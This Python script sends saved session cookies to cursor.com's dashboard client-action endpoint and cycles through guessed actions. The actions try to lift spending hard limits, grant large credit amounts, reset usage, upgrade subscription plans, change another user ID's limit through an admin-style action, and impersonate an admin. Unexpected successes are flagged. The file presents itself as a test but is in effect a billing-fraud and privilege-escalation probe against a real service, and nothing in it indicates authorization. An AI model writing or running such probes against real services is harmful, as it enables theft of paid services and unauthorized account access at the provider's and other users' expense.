#!/usr/bin/env python3
"""Test client-action endpoint with various action payloads."""
import json
import sys
from pathlib import Path
from urllib.parse import unquote

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

BASE = "https://cursor.com"
URL = f"{BASE}/api/dashboard/client-action"

def load_cookies(path: Path) -> dict:
    with open(path) as f:
        data = json.load(f)
    return {c["name"]: c["value"] for c in data}

def main():
    cookies = load_cookies(Path(__file__).parent / "cookies")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Origin": BASE,
        "Referer": f"{BASE}/dashboard/billing",
    }
    
    # Actions to test
    tests = [
        # Known working action (baseline)
        {"action": "getSetupOnboardingPromoState", "args": {}},
        
        # Try to list/discover actions
        {"action": "listActions", "args": {}},
        {"action": "help", "args": {}},
        {"action": "getActions", "args": {}},
        
        # Hard limit manipulation
        {"action": "setHardLimit", "args": {"hardLimitCents": 9999999}},
        {"action": "setHardLimitCents", "args": {"value": 9999999}},
        {"action": "updateHardLimit", "args": {"hardLimitCents": 9999999}},
        {"action": "setSpendingLimit", "args": {"limitCents": 9999999}},
        
        # Credit manipulation
        {"action": "addCredits", "args": {"amount": 99999}},
        {"action": "setCredits", "args": {"balance": 99999}},
        {"action": "addCreditGrant", "args": {"amount": 99999}},
        {"action": "grantCredits", "args": {"amount": 99999}},
        
        # Usage manipulation
        {"action": "updateUsage", "args": {"used": 0}},
        {"action": "resetUsage", "args": {}},
        {"action": "setUsage", "args": {"value": 0}},
        
        # Plan/subscription
        {"action": "setPlan", "args": {"plan": "ultra"}},
        {"action": "setSubscription", "args": {"tier": "business"}},
        {"action": "upgradePlan", "args": {"plan": "pro"}},
        
        # Try camelCase variations
        {"action": "getHardLimit", "args": {}},
        {"action": "getCreditBalance", "args": {}},
        {"action": "getCurrentUsage", "args": {}},
        
        # Admin-style actions
        {"action": "adminSetHardLimit", "args": {"userId": "user_01KHTHPRT0QDGRGJ4P89FG72KK", "hardLimitCents": 9999999}},
        {"action": "impersonate", "args": {"userId": "admin"}},
        
        # Invalid/error probing
        {"action": "", "args": {}},
        {"action": "nonexistent_action_12345", "args": {}},
    ]
    
    print("=" * 80)
    print("Testing client-action endpoint")
    print("=" * 80)
    
    for payload in tests:
        try:
            r = requests.post(URL, json=payload, cookies=cookies, headers=headers, timeout=15)
            status = r.status_code
            text = r.text[:200]
            
            # Flag interesting responses
            flag = ""
            if status == 200 and "error" not in text.lower():
                if payload["action"] not in ["getSetupOnboardingPromoState", "getHardLimit", "getCreditBalance", "getCurrentUsage"]:
                    flag = " [!!!]"
            if status != 200 and status != 400 and status != 404:
                flag = f" [unexpected status]"
            
            print(f"\n{payload['action'] or '(empty)'}:")
            print(f"  status={status} | {text!r}{flag}")
        except Exception as e:
            print(f"\n{payload['action']}:")
            print(f"  ERROR: {e}")

    print("\n" + "=" * 80)
    print("Done")
    print("=" * 80)

if __name__ == "__main__":
    main()
